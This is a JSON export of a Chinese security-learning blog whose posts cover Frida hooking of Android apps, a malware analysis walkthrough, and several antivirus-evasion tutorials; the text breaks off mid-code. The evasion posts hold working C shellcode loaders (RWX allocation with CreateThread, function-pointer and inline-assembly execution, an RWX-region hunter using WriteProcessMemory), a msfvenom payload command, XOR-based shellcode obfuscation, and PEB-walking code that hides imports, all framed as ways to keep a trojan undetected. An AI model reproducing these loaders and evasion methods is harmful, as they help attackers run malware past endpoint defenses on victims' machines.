{"meta":{"title":"e1ectr0nlc's Blog","subtitle":"","description":"学习记录","author":"e1ectr0nlc","url":"https://e1ectr0nlc.github.io","root":"/"},"pages":[{"title":"","date":"2024-05-12T09:37:12.696Z","updated":"2024-05-12T09:37:12.696Z","comments":true,"path":"404.html","permalink":"https://e1ectr0nlc.github.io/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"","date":"2024-05-12T09:34:36.954Z","updated":"2024-05-12T09:34:36.954Z","comments":true,"path":"mylist/index.html","permalink":"https://e1ectr0nlc.github.io/mylist/index.html","excerpt":"","text":""},{"title":"文章分类","date":"2024-05-12T13:29:32.339Z","updated":"2024-05-12T13:29:32.339Z","comments":true,"path":"categories/index.html","permalink":"https://e1ectr0nlc.github.io/categories/index.html","excerpt":"","text":""},{"title":"","date":"2024-05-12T09:33:11.243Z","updated":"2024-05-12T09:33:11.243Z","comments":true,"path":"about/index.html","permalink":"https://e1ectr0nlc.github.io/about/index.html","excerpt":"","text":""},{"title":"我的朋友们","date":"2024-05-12T09:15:32.520Z","updated":"2024-05-12T09:15:32.520Z","comments":true,"path":"friends/index.html","permalink":"https://e1ectr0nlc.github.io/friends/index.html","excerpt":"","text":""}],"posts":[{"title":"Frida学习(二)","slug":"Frida学习(二)","date":"2024-04-14T16:00:00.000Z","updated":"2024-05-12T13:37:39.427Z","comments":true,"path":"2024/04/15/Frida学习(二)/","permalink":"https://e1ectr0nlc.github.io/2024/04/15/Frida%E5%AD%A6%E4%B9%A0(%E4%BA%8C)/","excerpt":"这篇文章用来记录Frida在Hook各种方法时的脚本编写。","text":"这篇文章用来记录Frida在Hook各种方法时的脚本编写。 测试源码 1234567891011121314151617181920212223242526272829303132package com.example.lesson4one;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.util.Log;public class MainActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); while (true)&#123; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; throw new RuntimeException(e); &#125; int m; m = fun(50, 80); &#125; &#125; int fun(int x, int y)&#123; Log.d(&quot;e1ectr0nlc&quot;, String.valueOf(x + y)); return x + y; &#125;&#125; 控制台运行 1frida -U -l xxx.js com.example.lesson4one Hook调用的方法 使用Frida获取到调用的fun（）函数。 12345678910function main()&#123; Java.perform(function()&#123; Java.use(&quot;com.example.lesson4one.MainActivity&quot;).fun.implementation = function(arg1,arg2)&#123; var result = this.fun(arg1,arg2);//或者这里将参数改为两个整数例如（48，56） console.log(&quot;arg1, arg2, result&quot;, arg1, arg2, result); return result; &#125; &#125;)&#125;setImmediate(main) Hook重载的方法更改源码如下 1234567891011121314151617181920212223242526272829303132333435363738394041package com.example.lesson4one;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.util.Log;public class MainActivity extends AppCompatActivity &#123; private static String total = &quot;@@@@####@@@@&quot;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); while (true)&#123; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; throw new RuntimeException(e); &#125; int m = fun(50,80); Log.d(&quot;e1ectr0nlc m = &quot;, String.valueOf(m)); Log.d(&quot;e1ectr0nlc tolowercase&quot;, fun(&quot;LOWERCASEME!&quot;)); &#125; &#125; String fun(String x )&#123; total +=x ; return x.toLowerCase();//大写改小写 &#125; int fun(int x, int y)&#123; Log.d(&quot;e1ectr0nlc&quot;, String.valueOf(x + y)); return x + y; &#125;&#125; JS脚本如下 1234567891011121314151617function main()&#123; Java.perform(function()&#123; Java.use(&quot;com.example.lesson4one.MainActivity&quot;).fun.overload(&#x27;int&#x27;, &#x27;int&#x27;).implementation = function(arg1, arg2)&#123; var result = this.fun(100, 200); // 更改参数console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Throwable&quot;).$new())); // 打印调用栈,不需要的话可以注释掉。 console.log(&quot;arg1, arg2, result&quot;, arg1, arg2, result); return result; &#125; Java.use(&quot;com.example.lesson4one.MainActivity&quot;).fun.overload(&#x27;java.lang.String&#x27;).implementation = function (arg1 )&#123; var result = this.fun(Java.use(&#x27;java.lang.String&#x27;).$new(&quot;NIHAOJAVA&quot;)); console.log(&quot;arg1,result&quot;,arg1,result) return result; //return Java.use(&#x27;java.lang.String&#x27;).$new(&quot;NIHAOJS&quot;);直接更改返回值 &#125; &#125;)&#125;setImmediate(main) 打印结果如下 同时App内的日志信息也会改变 Hook未调用的方法在源码中添加一个没有调用过的函数 1234//添加函数但不调用String secret()&#123; return total; &#125; 脚本代码 1234567891011function main()&#123; Java.perform(function()&#123; Java.choose(&quot;com.example.lesson4one.MainActivity&quot;,&#123; onMatch:function(instance)&#123; console.log(&quot;found instance :&quot;,instance) console.log(&quot;found instance :&quot;,instance.secret()) &#125;,onComplete:function()&#123;&#125; &#125;) &#125;)&#125;setImmediate(main) Hook未调用的静态方法1234//测试代码中添加未调用的静态方法public static String secret2()&#123; return total; &#125; Hook脚本 1234567function main()&#123; Java.perform(function()&#123; var result = Java.use(&quot;com.example.lesson4one.MainActivity&quot;).secret2(); console.log(result); &#125;)&#125;setImmediate(main) 总的测试代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package com.example.lesson4one;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.util.Log;public class MainActivity extends AppCompatActivity &#123; private static String total = &quot;@@@@####@@@@&quot;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); while(true)&#123; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; int m = fun(50,80); Log.d(&quot;e1ectr0nlc m = &quot;, String.valueOf(m)); Log.d(&quot;e1ectr0nlc tolowercase&quot;, fun(&quot;LOWERCASEME!&quot;)); &#125; &#125; String fun(String x )&#123; total +=x ; return x.toLowerCase(); &#125; int fun(int x ,int y)&#123; Log.d(&quot;e1ectr0nlc&quot;, String.valueOf((x+y))); return x+y; &#125; String secret()&#123; return total; &#125; public static String secret2()&#123; return total; &#125;&#125;","categories":[{"name":"Hook框架","slug":"Hook框架","permalink":"https://e1ectr0nlc.github.io/categories/Hook%E6%A1%86%E6%9E%B6/"}],"tags":[]},{"title":"Frida学习(一)","slug":"Frida学习(一)","date":"2024-04-11T16:00:00.000Z","updated":"2024-05-12T13:40:26.896Z","comments":true,"path":"2024/04/12/Frida学习(一)/","permalink":"https://e1ectr0nlc.github.io/2024/04/12/Frida%E5%AD%A6%E4%B9%A0(%E4%B8%80)/","excerpt":"学习Frida脚本的编写","text":"学习Frida脚本的编写 Frida脚本的概念FRIDA脚本就是利用FRIDA动态插桩框架，使用FRIDA导出的API和方法，对内存空间里的对象方法进行监视、修改或者替换的一段代码。FRIDA的API是使用JavaScript实现的，所以我们可以充分利用JS的匿名函数的优势、以及大量的hook和回调函数的API。如果不了解匿名函数，可以先简单了解一下，相信对你编写Frida脚本会有帮助。 举一个最简单的例子 123456function main()&#123; Java.perform(function()&#123; console.log(&quot;hello world&quot;); &#125;) &#125; setImmediate(main) 这段代码的作用是在 Android 应用程序的 Java 虚拟机中执行一个函数，该函数将在 Frida 控制台输出 &quot;hello world&quot;。 控制台运行 1frida -U -l hello-world.js android.process.media “-U”表示使用USB连接到设备，而不是通过网络连接；”-l”表示指定要加载的JavaScript脚本文件；”android.process.media”是目标进程的名称 解释一下这段代码， 首先是function main() &#123; ... &#125;是javascript中定义函数的语法，函数名为main。 Java.perform(function() &#123; ... &#125;);是Frida中的一个重要函数，它接受一个函数作为参数，在被Frida Hook的Java虚拟机中执行。在这个函数内部，可以使用Frida提供的API接口来进行动态分析、修改、拦截等操作。 console.log(&quot;hello world&quot;);: 这是 JavaScript 中的输出语句，用于在 Frida 控制台输出信息。在这里，它将输出字符串 “hello world setImmediate(main): 这是 JavaScript 中的一个函数，用于在当前 JavaScript 事件循环的下一个循环迭代中执行指定的函数。在这里，它用于在当前 JavaScript 执行栈结束后立即调用 main 函数。 进阶操作了解了Frida如何进行基本的使用，接下来就可以尝试使用一些API函数进行操作。 FRIDA的API手册 枚举所有加载的类123456789101112function main()&#123; Java.perform(function()&#123; console.log(&quot;\\n[*] enumerating classes...&quot;); Java.enumerateLoadedClasses(&#123; onMatch: function(_className)&#123; console.log(&quot;[*] found instance of &#x27;&quot;+_className+&quot;&#x27;&quot;); &#125;, onComplete: function()&#123; console.log(&quot;[*] class enuemration complete&quot;); &#125;) &#125; setImmediate(main) 保存并执行 可以得到如下结果 太多了只截取了最后一段 解释一下这段代码： Java.enumerateLoadedClasses(&#123; ... &#125;): 这是 Frida 提供的一个方法，用于枚举当前已加载的所有类。它接受一个 JavaScript 对象作为参数，该对象包含两个属性：onMatch 和 onComplete onMatch: function(_className) &#123; ... &#125;: 这是一个回调函数，用于处理每个匹配到的类名。在每次找到一个类名时，这个函数会被调用。在这个函数中，类名存储在 _className 参数中，并通过 console.log 输出到 Frida 控制台 onComplete: function() &#123; ... &#125;: 这也是一个回调函数，当所有类都被枚举完毕时调用。在这个函数中，通过 console.log 输出一条消息表示类枚举过程完成 定位目标类我们既然可以获取到加载的所有类，也可以获取指定类。假如我们需要获取有关蓝牙的某个类，代码如下： 123456789101112131415function main()&#123; Java.perform(function()&#123; Java.enumerateLoadedClasses(&#123; onMatch: function(instance)&#123; if (instance.split(&quot;.&quot;)[1] == &quot;bluetooth&quot;)&#123; console.log(&quot;[-&gt;]\\t&quot;+instance); &#125; &#125;, onComplete: function() &#123; console.log(&quot;[*] class enuemration complete&quot;); &#125; &#125;); &#125;)&#125;setImmediate(main) 这里不再赘述代码的其他部分，只说onMatch函数的判断 instance是通过Java.enumerateLoadedClasses获取到的类，代表一个完整类名 split(&quot;.&quot;)[1]是JavaScript的字符串方法，用于按照分隔符将字符串进行分割，因为类名多是以&quot;.&quot;进行命名，所以将&quot;.&quot;作为分割符使用，[1]则是JavaScript 数组索引操作符，用于获取数组中指定索引位置的元素。在这里，我们获取分割后的字符串数组的第二个元素，即索引为1的元素。 打印类的实例在我们定位到目标类后，就可以打印想要研究的类的实例了 代码： 1234567891011function main()&#123; Java.perform(function()&#123; Java.choose(&quot;android.bluetooth.BluetoothDevice&quot;,&#123; onMatch: function (instance)&#123; console.log(&quot;[*] &quot;+&quot; android.bluetooth.BluetoothDevice instance found&quot;+&quot; :=&gt; &#x27;&quot;+instance+&quot;&#x27;&quot;); bluetoothDeviceInfo(instance); &#125;, onComplete: function() &#123; console.log(&quot;[*] -----&quot;);&#125; &#125;)&#125;setImmediate(main) 运行 1frida -U -l hello.js com.android.bluetooth 枚举所有方法使用java.use()获取所有方法 12345678910111213141516171819function main() &#123; Java.perform(function () &#123; // 获取 android.bluetooth.IBluetoothHeadset 接口的类对象 var BluetoothHeadset = Java.use(&#x27;android.bluetooth.IBluetoothHeadset&#x27;); // 获取该接口的所有方法 var methods = BluetoothHeadset.class.getDeclaredMethods(); // 遍历所有方法 for (var i = 0; i &lt; methods.length; i++) &#123; var method = methods[i]; // 输出方法名 console.log(method.toString()); &#125; &#125;);&#125;// 立即执行枚举方法setImmediate(main) 控制台命令 1frida -U -l hello.js com.android.bluetooth 获取了方法，接下来就是对方法的各种修改拦截了。","categories":[{"name":"Hook框架","slug":"Hook框架","permalink":"https://e1ectr0nlc.github.io/categories/Hook%E6%A1%86%E6%9E%B6/"}],"tags":[]},{"title":"恶意程序分析流程","slug":"恶意程序分析流程","date":"2024-04-09T16:00:00.000Z","updated":"2024-05-13T03:28:57.513Z","comments":true,"path":"2024/04/10/恶意程序分析流程/","permalink":"https://e1ectr0nlc.github.io/2024/04/10/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%B5%81%E7%A8%8B/","excerpt":"这段时间想着来分析几个木马程序练练手，这篇博客就来记录一下整个恶意代码的分析过程，有个大致了解，同时也想看看木马如何获取到目标主机的权限，对攻击手法有一个大致的了解。","text":"这段时间想着来分析几个木马程序练练手，这篇博客就来记录一下整个恶意代码的分析过程，有个大致了解，同时也想看看木马如何获取到目标主机的权限，对攻击手法有一个大致的了解。 对程序本身特征进行检查查壳 程序为32位程序，没有加壳 查看PE文件节表信息 可以看到节表中有一个叫”baidu”的段，正常程序中不会有这个段 查看文件存在的字符串 存在一个网址，猜测可能有网络操作 查看恶意程序进行分析源程序shoves.exe的函数 静态分析没有得到结果，尝试在OD中动态分析 在0x41021A地址处存在一个解密函数，将0x4106bc处的内容动态解密 解密前： 解密后： 可以看到Dos头已经出现了，说明这是另外的一个PE文件，dump出来后发现是一个dll文件 接着分析Dll文件 为进程提权通过OpenProcessToken得到进程的令牌句柄，使用LookupPrivilegeValue查询进程权限，最后用AdjustTokenPrivileges函数提升权限 删除日志通过OpenEventLog函数打开日志文件，如果成功打开，调用ClearEventLog函数清除日志文件，最后调用CloseEventLog函数关闭日志文件 关闭杀软查询系统镜像，获得所有进程信息，并查找杀软 杀软字典","categories":[{"name":"bypass","slug":"bypass","permalink":"https://e1ectr0nlc.github.io/categories/bypass/"}],"tags":[]},{"title":"shellcode的加载","slug":"shellcode的加载方式","date":"2023-11-11T16:00:00.000Z","updated":"2024-05-12T12:50:06.461Z","comments":true,"path":"2023/11/12/shellcode的加载方式/","permalink":"https://e1ectr0nlc.github.io/2023/11/12/shellcode%E7%9A%84%E5%8A%A0%E8%BD%BD%E6%96%B9%E5%BC%8F/","excerpt":"今天来学习一下shellcode的各种加载方式、","text":"今天来学习一下shellcode的各种加载方式、 动态内存分配概念在进程的内存空间中，你有没有想过执行一段shellcode需要什么？为了执行你的shellcode，需要完成三个检查： 1.内存是否被标记为可执行的虚拟地址空间，否则DEP将抛出内存访问冲突异常； 2.是否将shellcode放入了该内存空间； 3.是否将代码的执行流定位到该内存空间。 完成这三步可以使用API来理解，首先VirtualAlloc分配出一片可读、可写可执行的内存，将shellcode使用RtlMoveMemory之类的函数复制到该内存空间，最后创建一个指向新分配内存区域的线程来执行shellcode。 代码如下： 1234567891011121314#include &lt;windows.h&gt;int main()&#123;char shellcode[] = &quot;\\xcc\\xcc\\xcc\\xcc\\x41\\x41\\x41\\x41&quot;;// 分配内存LPVOID addressPointer = VirtualAlloc(NULL, sizeof(shellcode), 0x3000, 0x40);// 复制shellcodeRtlMoveMemory(addressPointer, shellcode, sizeof(shellcode));// 新建线程指向新分配的内存空间CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, 0);// 休眠一秒钟等待线程Sleep(1000);return 0;&#125; 值得注意的是，虽然这段代码将 shellcode 拷贝到了堆内存中，但这只是为了将其执行（因为已经赋予这片内存空间RWX权限了）。默认情况下受到Windows XP中引入的系统范围数据执行保护（DEP）策略的保护。对于启用DEP的进程，这将防止在此内存区域执行代码。为了克服这个障碍，我们要求系统将所需的内存区域标记为RWX。这是通过将VirtualAlloc的最后一个参数指定为0x40来实现的，就相当PAGE_EXECUTE_READWRITE。 缺点WinAPI调用的使用很容易被成熟的AV&#x2F;EDR系统检测到。 通过函数指针分配概念函数指针是指向函数的指针变量。在C语言中，函数名实际上就是该函数在内存中的地址，因此可以将函数名赋值给指针变量，从而使得该指针变量指向该函数。 代码： 1234567891011121314151617#include &lt;windows.h&gt;int main()&#123;char buf[] = &quot;\\xcc\\xcc\\xcc\\xcc&quot;;//定义函数指针funcint (*func)();//将buf的地址类型强转为函数指针，赋值给funcfunc = (int (*)()) (void*)buf;(int)(*func)(); // 另一个函数指针运行方式// (*(int(*)()) buf)();// sleep for a secondSleep(1000);return 0;&#125; 这段代码就实现了将shellcode的地址作为函数去执行。但shellcode此时在内存作为调试指令，并没有尝试执行任何非法内存区域的代码，所以也不会触发DEP。如果shellcode中包含了真正的恶意代码，可能会尝试执行或修改内存中的敏感区域，这时应该就会触发DEP。我们可以通过设置&#x2F;NXCOMPAT：NO标志来简单地为已编译的可执行文件禁用DEP（对于VisualStudio，可以在高级链接器选项中设置）。这样，shellcode就会被顺利的执行。 通过这种加载方式，可以用来避免AV&#x2F;DER的检测，并且这种方式加载，shellcode会在栈上作为局部变量分配，栈是可读可写的，就允许我们在这个内存区域中对shellcode进行加密。 缺点DEP会阻止栈中代码的执行，需要在没有DEP支持的情况下编译代码。 .Text段加载概念代码段存在可执行权限，所以无需担心DEP抛出异常，问题在于如何将shellcode放置和执行在代码段。首先API函数不可用，因为代码段是没有写权限的；函数指针也用不上，将位于数据段的shellcode转为函数指针来执行也依然在数据段中。那么还有内联汇编这个办法可以使用。 代码： 123456#include &lt;Windows.h&gt;int main() &#123;asm(&quot;.byte 0xde,0xad,0xbe,0xef,0x00\\n\\t&quot;&quot;ret\\n\\t&quot;);return 0;&#125; 此代码是项目中的一个demo，使用Gcc编译环境就可以编译运行了。 因为没有API调用，所以可以用来避免AV&#x2F;EDR的检测。 缺点缺点很明显，因为没有可写权限，所以没有加密过的shellcode很容易就会被检测出来。为了避免被检测可以在内联汇编中进行代码的加密和解密。 RWX-Hunter概念意思很明显，就是去寻找内存中被标记为R-W-X的区域，既避免了使用高危API开辟空间，也无需担心会触发DEP警告。但这里还有很多问题需要考虑。 如何查找可执行的内存区域； 如何将shellcode放入此内存； 如何将代码执行流运行到此处。 进程4G的虚拟内存，范围从0x00000000到0x7fffffff，搜索范围就可以确定下来，用VirtualQueryEx查询从0开始的内存信息，接下来判断是否为可读可写可执行的区域，如果找到就可以写入shellcode，我们可以用API来解决写入这个问题，或者使用函数指针也可以。最后执行也可以考虑API函数或者函数指针来调用shellcode执行。 代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;psapi.h&gt;#include &lt;tchar.h&gt;LPVOID Hunt(DWORD processID)&#123; HMODULE hMod; DWORD cbNeeded; TCHAR szProcessName[MAX_PATH] = TEXT(&quot;&lt;unknown&gt;&quot;); //获取目标进程句柄 HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processID); if (EnumProcessModules(process, &amp;hMod, sizeof(hMod), &amp;cbNeeded)) &#123; //枚举指定进程的模块，并获取每个模块的基本信息 GetModuleBaseName(process, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR)); &#125; if (process) &#123; _tprintf(TEXT(&quot;[*] Searching in %s (PID: %u)...&quot;), szProcessName, processID); long MaxAddress = 0x7fffffff; long address = 0; int c = 0; do &#123; //MEMORY_BASIC_INFORMATION 结构体m MEMORY_BASIC_INFORMATION m; //VirtualQueryEx 函数来查询指定进程中从 address 开始的内存信息，并将结果存储在结构体m int result = VirtualQueryEx(process, (LPVOID)address, &amp;m, sizeof(MEMORY_BASIC_INFORMATION)); //判断m.AllocationProtect 是否等于PAGE_EXECUTE_READWRITE if (m.AllocationProtect == PAGE_EXECUTE_READWRITE) &#123; printf(&quot;RWX found at 0x%x\\n&quot;, m.BaseAddress); return m.BaseAddress; &#125; else if( c &gt; 50000 )&#123; printf(&quot;Still Hunting&quot;); c = 0; &#125; else &#123; c += 1; &#125; //如果找到该空间，则返回该空间 if (address == (long)m.BaseAddress + (long)m.RegionSize) break; //否则将下一个搜索地址设置为下一个存储区域(基地址+内存区域)。 address = (long)m.BaseAddress + (long)m.RegionSize; &#125; while (address &lt;= MaxAddress); printf(&quot;Nope\\n&quot;); &#125; else &#123; _tprintf(TEXT(&quot;[*] No Access for %s (PID: %u) \\n&quot;), szProcessName, processID); &#125; return 0;&#125;void Exec(LPVOID address, DWORD processID)&#123; printf(&quot;[*] Exec Shellcode... &quot;); // msfvenom -p windows/x64/exec CMD=&#x27;&quot;C:\\Windows\\System32\\cmd.exe&quot;&#x27; EXITFUNC=thread --platform Windows -f c char shellcode[] = &quot;&quot;; //打开当前进程 HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID); //写入shellcode WriteProcessMemory(procHandle, address, shellcode, sizeof(shellcode), 0); //运行shellcode hThread = CreateThread(0, 0, (LPVOID)(address), NULL, 0, 0); printf(&quot;Done \\n&quot;);&#125;int main()&#123; printf(&quot;Starting Search \\n&quot;); //搜索的起始地址 LPVOID spaceAddress = 0; //当前进程PID DWORD currentProc = GetCurrentProcessId(); printf(&quot;Current PID: %d&quot;, (int)currentProc); //获取RWX地址 spaceAddress = Hunt(currentProc); if (spaceAddress &gt; 0) &#123; //执行shellcode Exec(spaceAddress, currentProc); &#125; else&#123; printf(&quot;Error!&quot;); &#125; Sleep(10000); return 0;&#125; 代码借鉴于https://github.com/csandker/inMemoryShellcode.git 缺点无法绕过代码执行时的高危API函数，但也许在关联检查时可以绕过一些AV&#x2F;EDR。再进阶一下，使用API隐藏技术进行API的调用，或许可以免杀绕过。","categories":[{"name":"bypass","slug":"bypass","permalink":"https://e1ectr0nlc.github.io/categories/bypass/"}],"tags":[]},{"title":"免杀初探","slug":"免杀学习总结与后续学习","date":"2023-11-11T16:00:00.000Z","updated":"2024-05-12T13:00:49.206Z","comments":true,"path":"2023/11/12/免杀学习总结与后续学习/","permalink":"https://e1ectr0nlc.github.io/2023/11/12/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E4%B8%8E%E5%90%8E%E7%BB%AD%E5%AD%A6%E4%B9%A0/","excerpt":"在我初学免杀时，也自己手动实现了一个程序，不过还是没有逃过杀毒软件的识别😀。今天就先来总结一下已经学习过的知识，避免忘记。","text":"在我初学免杀时，也自己手动实现了一个程序，不过还是没有逃过杀毒软件的识别😀。今天就先来总结一下已经学习过的知识，避免忘记。 大致了解首先做免杀是为了什么，肯定是我们想让我们的木马可以运行而且不被杀软识别。我们的木马是什么？就是我们使用MSF或者CS生成的shellcode，那么就引进来了一个重要概念：shellcode。 这里就不过多介绍生成shellcode的工具了，已经有很多教程详细介绍了如何使用，生成shellcode后，还需要一个shellcodeloader，用来加载shellcode，不然单指望一个shellcode就可以到达我们远程控制的目的，实在是有些小看各大安全厂商所付出的努力了。这里就又绕回到免杀上来了，我们的shellcodeloader如何才能不被各家安全厂商的识别为木马程序，就是我们学习的重点。 总结一下这一部分的重点：shellcode的生成、shellcodeloader的免杀。 检测方法俗话说知己知彼，百战百胜。我们只有知道各大安全厂商是如何大致检测木马程序，才能有针对的进行绕过。 基于特征码的扫描这个不难理解，对文件或内存中的存在的特征做检测，像字符串或者高危API函数。检测方法是做模糊哈希或者机器学习跑模型，内部应该是一种累计计数方式为程序进行检测，等危险函数或字符串累积到一定阈值，就报警。这种方法准确度很高，但是很难针对未知的木马。 关联检测这个就很难说明白了。有可能检测shellcode的特征，或者也可能是一组关联的代码，把一组关联信息作为特征。按照我的理解来说，这个关联特征应该与shellcode的加载有关，比如使用远程线程加载技术时，就不可避免的使用一些API函数，当这些API函数单独出现不会报警，但要是一起出现就可能被当作木马。 沙箱我觉得沙箱应该和行为检测是一种类型。启动一个虚拟环境给疑似木马的程序运行，提供它可能用到的一切元素，包括硬盘，端口等，让它在其上自由发挥，最后根据其行为来判定是否为病毒。主要针对的就是变形木马。 如何绕过针对上述检测方法，有许多大佬孜孜不倦的开发出了许多方法进行绕过。本人也不过在这里拾人牙慧，略做总结。 针对特征码检测加密shellcode既然你可以在文件中通过我的shellcode和硬编码的字符串检测到我，那么我就变形，消除特征。具体操作就是对shellcode和硬编码字符串进行异或、编码或者加密，等我到内存中自解密，不影响程序正常执行。但是要注意加密操作可能影响文件信息熵的增加，笔者曾经在某位大佬的博客中见到有些杀软会检测信息熵的大小，如果过高也会定义为木马程序。 代码实现（vs2017）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;iostream&gt;#include&lt;Windows.h&gt;#include&lt;string.h&gt;unsigned char shellcode[] =&#123; //你的shellcode&#125;; void xorcode(char *shellBuffer, int nlength, int key)&#123; int i = 0; for (i = 0; i &lt; nlength; i++) &#123; shellBuffer[i] ^= key; &#125;&#125;void recode(char*szBuffer, int nLength)&#123; char *szTemp = new char[nLength] &#123;0&#125;; int count = nLength - 1; for (int i = 0; i &lt; count; i++) szTemp[count - i] = szBuffer[i]; for(size_t i = 0; i &lt;=count; i++) szBuffer[i]=szTemp[i];&#125;void WriteToFile(const char*szPath, char*szBuffer, int nLength)&#123; HANDLE hFile = CreateFileA(szPath, GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); DWORD lpNumberOfBytesWritten = 0; BOOL bRet = WriteFile(hFile, szBuffer, nLength, &amp;lpNumberOfBytesWritten, NULL); if (bRet) std::cout &lt;&lt; &quot;WriteFile Success!&quot; &lt;&lt; std ::endl; else std::cout &lt;&lt; &quot;WriteFile Failed!&quot; &lt;&lt; std :: endl;&#125;int main()&#123; recode((char*)&amp;shellcode, sizeof(shellcode)); //将shellcode倒叙 xorcode((char*)&amp;shellcode, sizeof(shellcode), 0x75);//异或shellcode WriteToFile(&quot;D:\\\\shellcode.ini&quot;, (char*)&amp;shellcode, sizeof(shellcode));//将shellcode写入shellcode.ini中 return 0;&#125;//W-------------------------------------我是分割线--------------------------------------W这段代码是对应的shellcodeloader程序的main函数，先解密，再在当前进程分配内存空间，写入shellcoed，接着创建一个线程，起始地址为分配空间的地址，执行shellcode//int main()//&#123;//// xorcode((char*)&amp;shellcode, sizeof(shellcode), 0x75);// recode((char*)&amp;shellcode, sizeof(shellcode));// LPVOID lpBuffer = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);// SIZE_T lpNumberOfBytesWritten = 0;// WriteProcessMemory(GetCurrentProcess(), lpBuffer, shellcode, sizeof(shellcode), &amp;lpNumberOfBytesWritten);// HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, NULL);// if (hThread != NULL) &#123;// printf(&quot;success&quot;);// &#125;// else &#123;// printf(&quot;error&quot;);// &#125;// WaitForSingleObject(hThread, INFINITE);// return 0;//&#125; 通过上述代码就可以将你的shellcode进行简单加密，当在shellcodeloader中加载shellcode的时候也要先解密再运行。 shellcode分离这种思路是你既然从程序中检测到我的shellcode，那么我就不把shellcode写进程序中，而是通过网络连接远程读取程序获取sehllcode，再执行shellcode。由于笔者没有马内买不起服务器，所以暂时没有实现shellcode分离的代码。 加壳免杀一些加壳软件对程序加壳后，基本可以实现特征码的覆盖。这里指的加壳软件是加密壳，本质还是对shellcode进行加密来隐藏特征。这里笔者也没有做过尝试，是理论可行的范围。 针对关联检测隐藏IAT当我们调用API时可以在导入表中明显看到，这对于木马编写者来说肯定是一大败笔，因为反病毒人员很轻松就能看到你有没有调用可疑函数进行一连串的操作，那么我们就要隐藏我们的导入函数。 代码实现（vs2017）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;iostream&gt;#include &lt;Windows.h&gt;// 获取 Kernel32.dll 的基址DWORD GetKernel32Address()&#123; // 使用汇编获取 TEB 和 PEB 结构，从而获取 Kernel32.dll 的基址 DWORD dwKernel32Addr = 0;_asm &#123; push eax mov eax, dword ptr fs:[0x30] mov eax, [eax + 0x0c] mov eax, [eax + 0x1C] mov eax, [eax] mov eax, [eax + 0x08] mov dwKernel32Addr, eax pop eax&#125;return dwKernel32Addr;&#125;DWORD MyGetProcAddress()&#123; DWORD dwAddrBase =GetKernel32Address();// 获取 Kernel32.dll 的基址 PIMAGE_DOS_HEADER pDos=(PIMAGE_DOS_HEADER)dwAddrBase;// 转换为 DOS 头指针 PIMAGE_NT_HEADERS pNt=(PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew +dwAddrBase);// 转换为 NT 头指针 PIMAGE_DATA_DIRECTORY pDataDir= pNt-&gt;OptionalHeader.DataDirectory+IMAGE_DIRECTORY_ENTRY_EXPORT;// 获取导出表数据目录 PIMAGE_EXPORT_DIRECTORY pExport=(PIMAGE_EXPORT_DIRECTORY)(dwAddrBase+pDataDir-&gt;VirtualAddress);// 获取导出表 DWORD dwFunCount= pExport-&gt;NumberOfFunctions;// 导出函数表数量 DWORD dwFunNameCount =pExport-&gt;NumberOfNames;// 导出函数名数量 PDWORD pAddrOfFun=(PDWORD)(pExport-&gt;AddressOfFunctions+dwAddrBase);// 函数地址表指针 PDWORD pAddrOfNames=(PDWORD)(pExport-&gt;AddressOfNames+dwAddrBase);// 函数名表指针 PWORD pAddrOfOrdinals=(PWORD)(pExport-&gt;AddressOfNameOrdinals+dwAddrBase);// 序号表指针 for (size_t i = 0; i&lt; dwFunCount; i++)// 遍历导出函数表 &#123; if (!pAddrOfFun[i])// 如果函数地址为0，跳过 continue; DWORD dwFunAddrOffset =pAddrOfFun[i];// 获取当前函数地址偏移 for (size_t j = 0; j &lt; dwFunNameCount; j++)// 遍历导出函数名表 &#123; if (pAddrOfOrdinals[j] == i)// 如果序号表中的序号等于当前索引 &#123; DWORD dwNameOffset = pAddrOfNames[j];// 获取函数名偏移 char *pFuncName = (char *)(dwAddrBase + dwNameOffset);// 获取函数名地址 if (strcmp(pFuncName, &quot;GetProcAddress&quot;) == 0)// 如果函数名匹配 GetProcAddress return dwFunAddrOffset + dwAddrBase;// 返回 GetProcAddress 地址 &#125; &#125; &#125;&#125;// 自定义函数指针类型//LoadLibraryEXTERN_C typedef HMODULE(WINAPI *fnLoadLibraryA)( _In_ LPCSTR lpLibFileName);//GetProcAddressEXTERN_C typedef WINBASEAPIFARPROC(WINAPI *fnGetProcAddress) ( _In_ HMODULE hModule, _In_ LPCSTR 